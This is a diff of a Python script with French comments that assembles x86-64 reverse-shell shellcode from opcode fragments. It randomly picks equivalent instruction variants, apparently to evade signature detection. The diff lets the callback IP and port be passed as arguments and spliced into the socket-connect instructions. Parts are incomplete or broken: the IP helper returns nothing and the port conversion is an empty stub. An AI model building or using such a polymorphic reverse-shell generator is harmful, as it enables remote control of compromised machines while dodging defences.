@@ -1,6 +1,61 @@
-import random
+import random, sys
 
 shellcode = ""
+
+
+###### Fonctions ######
+
+
+#Récupération des paramètres
+
+ipv4 = sys.argv[1]
+port = sys.argv[2]
+
+#Transformation de l'ip en hexa puis inversement de l'ip pour être utilisé dans le shellcode.
+
+def ip_to_hex(ip):
+    if len(ip.split('.')) != 4:
+        print("IP incorrecte.")
+    else:
+        byte4, byte3, byte2, byte1 = ip.split('.')
+        byte4 = int(byte4)
+        byte3 = int(byte3)
+        byte2 = int(byte2)
+        byte1 = int(byte1)
+        my_hex_ip = (byte4 * (256**3))  + (byte3 * (256**2)) + (byte2 * 256) + (byte1)
+        my_hex_ip = hex(my_hex_ip)
+        print(my_hex_ip)
+        
+        
+        my_hex_ip = my_hex_ip.strip("0x")
+        if len(my_hex_ip) % 2 != 0:
+            raise ValueError("La chaîne hexadécimale doit avoir une longueur paire")
+        
+        bytes_list = [my_hex_ip[i:i + 2] for i in range(0, len(my_hex_ip), 2)]
+        my_hex_ip = ''.join(bytes_list[::-1])
+        print('---')
+        print(my_hex_ip)
+
+
+#Transformation du port en hexa puis inversement de l'ip pour être utilisé dans le shellcode.
+
+
+
+#Fonction qui ajoute les "\x" au shellcode.
+def shellcodize(s):
+    shellcode = 'X'
+    shellcode += 'X'.join(a+b for a,b in zip(s[::2], s[1::2]))
+    shellcode = shellcode.replace('X', '\\x')
+    print("Shellcode :")
+    print(shellcode)
+
+
+
+
+
+
+
+ipv4 = ip_to_hex(ipv4)
 
 ###### CREATION SOCKET ######
 
@@ -46,7 +101,6 @@ create_socket_syscall = ["0F05"]
 create_socket_mov = ["4989C1"]
 
 
-
 ###### CONNEXION SOCKET ######
 
 #push 0x2A -> 6A2A
@@ -68,7 +122,7 @@ connexion_socket_4 = ["5252"]
 
 #push 0x0101017f -> 687F010101
 
-connexion_socket_5 = ["687F010101"]
+connexion_socket_5 = ["68"] + [ipv4]
 
 #push word 0x5c11 -> D05C11
 
@@ -235,15 +289,16 @@ shellcode += random.choice(list_xorsyscall)
 shellcode += random.choice(list_lastcallsys)
 
 
-# Fonction qui permet l'ajout des /xFF/
-
-def shellcodize(s):
-    shellcode = 'X'
-    shellcode += 'X'.join(a+b for a,b in zip(s[::2], s[1::2]))
-    shellcode = shellcode.replace('X', '\\x')
-    print("Shellcode :")
-    print(shellcode)
 
 
-shellcodize(shellcode)
-print(len(shellcode))
+
+
+
+
+
+
+
+
+
+#shellcodize(shellcode)
+#print(len(shellcode))
